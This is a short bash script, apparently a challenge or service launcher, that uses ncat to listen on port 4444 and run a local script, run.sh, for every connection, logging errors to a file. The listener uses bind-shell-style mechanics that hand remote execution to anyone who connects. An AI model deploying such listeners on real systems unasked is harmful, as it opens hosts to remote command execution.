#!/bin/bash
ncat -v -l 4444 --sh-exec "./run.sh &" 2> nc_log
